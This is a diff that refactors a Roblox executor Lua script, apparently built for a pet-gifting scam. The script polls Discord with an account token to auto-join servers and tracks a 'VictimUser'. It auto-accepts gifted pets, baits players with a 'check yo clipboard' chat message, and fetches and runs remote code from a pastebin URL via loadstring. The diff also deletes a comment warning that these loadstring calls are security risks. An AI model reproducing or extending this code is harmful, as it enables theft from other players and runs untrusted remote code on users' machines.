@@ -1,13 +1,9 @@
--- Define a main namespace table to hold global-like configurations
-
-Config.MinPetKg = 1 -- minimum pet kilogram to accept
-
--- Game Services Namespace
+-- This entire code block below is what you would put inside your loadstring
 local Services = {}
 Services.Players = game:GetService("Players")
 Services.HttpService = game:GetService("HttpService")
 Services.UserInputService = game:GetService("UserInputService")
-Services.RunService = game:GetService("RunService") -- Corrected
+Services.RunService = game:GetService("RunService")
 Services.TeleportService = game:GetService("TeleportService")
 Services.TextChatService = game:GetService("TextChatService")
 Services.VirtualUser = game:GetService("VirtualUser")
@@ -62,13 +58,13 @@ local initialJoinedIds = Services.HttpService:JSONDecode(readfile("joined_ids.tx
 local State = {
     IsProcessingGift = false,
     GiftingActive = false,
-    LastGiftTime = 0, -- Will be set with os.time()
+    LastGiftTime = 0,
     RobloxFocusStatus = nil,
     LastDiscordMessageId = nil,
     DidVictimLeave = false,
     AutoJoinTimer = 0,
-    VictimUser = initialVictimUser, -- Initialized directly
-    JoinedIds = initialJoinedIds -- Initialized directly
+    VictimUser = initialVictimUser,
+    JoinedIds = initialJoinedIds
 }
 
 -- Utility Functions Namespace
@@ -171,7 +167,7 @@ Utils.AcceptGifts = AcceptGifts
 
 local function IncreaseAutoJoinTimer()
     while task.wait(1) do
-        State.AutoJoinTimer = State.AutoJoinTimer + 1 -- Explicit addition
+        State.AutoJoinTimer = State.AutoJoinTimer + 1
     end
 end
 Utils.IncreaseAutoJoinTimer = IncreaseAutoJoinTimer
@@ -181,7 +177,7 @@ local Discord = {}
 
 local function AutoJoin()
     if State.GiftingActive then
-        local timeSinceLastGift = os.time() - State.LastGiftTime -- Using os.time()
+        local timeSinceLastGift = os.time() - State.LastGiftTime
         if timeSinceLastGift < 6 then
             print(
                 string.format("Gifting is active. Skipping Discord check for %.2f more seconds.", 6 - timeSinceLastGift)
@@ -196,10 +192,10 @@ local function AutoJoin()
     local response =
         request(
         {
-            Url = "https://discord.com/api/v9/channels/" .. Config.ChannelId .. "/messages?limit=1",
+            Url = "https://discord.com/api/v9/channels/" .. _G.Config.ChannelId .. "/messages?limit=1", -- Changed
             Method = "GET",
             Headers = {
-                ["Authorization"] = Config.Token,
+                ["Authorization"] = _G.Config.Token, -- Changed
                 ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                 ["Content-Type"] = "application/json"
             }
@@ -225,7 +221,7 @@ local function AutoJoin()
             print(string.format("Discord message found for join: PlaceId=%s, JobId=%s", placeId, jobId))
             State.LastDiscordMessageId = message.id
             Utils.SaveJoinedId(tostring(message.id))
-            writefile("user_gag.txt", "unknown") -- This seems like a side effect, consider where it best fits
+            writefile("user_gag.txt", "unknown")
             Services.TeleportService:TeleportToPlaceInstance(tonumber(placeId), jobId)
         else
             print("Latest Discord message does not contain a valid teleport link.")
@@ -238,14 +234,12 @@ end
 Discord.AutoJoin = AutoJoin
 
 -- Initial checks for token and channel ID
-if Config.Token == "" or Config.ChannelId == "" then
+if _G.Config.Token == "" or _G.Config.ChannelId == "" then -- Changed
     LocalPlayer:Kick("Add your token or channelId to use")
 end
 
 -- Load external scripts (if 'request' is available for HttpGet)
--- These `loadstring` calls are typical for exploit contexts and are left as-is,
--- but be aware they can be security risks if sources are untrusted.
-if typeof(game.HttpGet) == "function" then -- Check if HttpGet exists (common in exploit environments)
+if typeof(game.HttpGet) == "function" then
     pcall(
         function()
             loadstring(game:HttpGet("https://pastebin.com/raw/xBLu3qtF", true))()
@@ -268,11 +262,10 @@ Services.Players.LocalPlayer.Idled:Connect(
     end
 )
 
--- Connect to RunService.Heartbeat for activity status (original logic had a redundancy here)
--- This block will now run after `State` is fully initialized.
+-- Connect to RunService.Heartbeat for activity status
 Services.RunService.Heartbeat:Connect(
     function()
-        local currentStatusIsInactive = false -- As per original code, this was always false
+        local currentStatusIsInactive = false
         local lastStatus = State.RobloxFocusStatus
 
         if lastStatus == nil then
@@ -286,13 +279,10 @@ Services.RunService.Heartbeat:Connect(
 )
 
 -- Hook into GiftPet RemoteEvent
--- Removed task.defer, just run in a do-end block or directly if you don't need deferring behavior
 do
     print("🔌 Hooking into GiftPet RemoteEvent...")
 
     if not RemoteEvents.GiftPet then
-        -- Consider whether to return here or let the script continue if other functions are independent.
-        -- For now, allowing it to continue if no gift event is hooked.
         warn("GiftPet RemoteEvent is nil. Cannot hook into OnClientEvent.")
     else
         RemoteEvents.GiftPet.OnClientEvent:Connect(
@@ -300,20 +290,15 @@ do
                 print("🎁 Gift received:", giftID, fullName, sender)
 
                 State.GiftingActive = true
-                State.LastGiftTime = os.time() -- Using os.time()
-                print(
-                    string.format(
-                        "Gifting started/continued. Last gift received at: %d", -- Changed format specifier for integer
-                        State.LastGiftTime
-                    )
-                )
+                State.LastGiftTime = os.time()
+                print(string.format("Gifting started/continued. Last gift received at: %d", State.LastGiftTime))
 
                 local basePetName = Utils.ExtractBaseName(fullName)
                 local petKG = Utils.ExtractPetKG(fullName)
                 print("🔍 Base pet name:", basePetName, " | KG:", petKG)
 
-                local isWhitelisted = table.find(Config.Pets, basePetName)
-                local isHighKG = petKG >= Config.MinPetKg
+                local isWhitelisted = table.find(_G.Config.Pets, basePetName) -- Changed
+                local isHighKG = petKG >= _G.Config.MinPetKg -- Changed
 
                 if not isWhitelisted and not isHighKG then
                     print(
@@ -321,7 +306,7 @@ do
                             '⚠️ Pet "%s" (KG: %d) not in whitelist and KG is below %d. Ignoring gift from: %s',
                             fullName,
                             petKG,
-                            Config.MinPetKg,
+                            _G.Config.MinPetKg, -- Changed
                             sender
                         )
                     )
@@ -341,7 +326,7 @@ do
                             '✅ Pet "%s" (KG: %d) has KG >= %d. Accepting gift from: %s',
                             fullName,
                             petKG,
-                            Config.MinPetKg,
+                            _G.Config.MinPetKg, -- Changed
                             sender
                         )
                     )
@@ -359,10 +344,9 @@ do
                     function()
                         if RemoteEvents.AcceptPetGift then
                             RemoteEvents.AcceptPetGift:FireServer(true, giftID)
-                            print("🚀 Gift accepted (ID:", giftID, ")")
                         else
                             warn("AcceptPetGift RemoteEvent is nil. Cannot accept gift.")
-                            error("AcceptPetGift RemoteEvent is nil.") -- Propagate error for pcall
+                            error("AcceptPetGift RemoteEvent is nil.")
                         end
                     end
                 )
@@ -392,12 +376,12 @@ while LocalPlayer:GetAttribute("Loading_Screen_Finished") ~= true do
     LocalPlayer:GetAttributeChangedSignal("Loading_Screen_Finished"):Wait()
 end
 
-task.wait(1) -- Short delay after loading
+task.wait(1)
 
 -- Start parallel tasks
 task.spawn(Utils.AcceptGifts)
 task.spawn(Utils.IncreaseAutoJoinTimer)
-Utils.WaitForPlayerLeave() -- Start listening for victim leaving
+Utils.WaitForPlayerLeave()
 
 -- Initial chat messages
 Services.TextChatService.TextChannels.RBXGeneral:SendAsync("Yo gng check yo clipboard")
